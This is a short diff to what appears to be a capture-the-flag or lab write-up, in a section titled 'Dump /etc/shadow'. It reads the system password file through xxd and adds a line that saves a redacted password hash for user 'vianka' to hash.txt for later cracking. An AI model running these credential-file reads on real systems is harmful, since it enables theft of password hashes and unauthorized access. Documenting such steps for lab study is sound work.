@@ -43,6 +43,7 @@ Dump /etc/shadow:
 ```python
 LFILE=/etc/shadow
 xxd "$LFILE" | xxd -r
+echo "vianka:***********************************************************************************************" > hash.txt
 ```
 Extract hash for user vianka and save to file hash.txt.
 
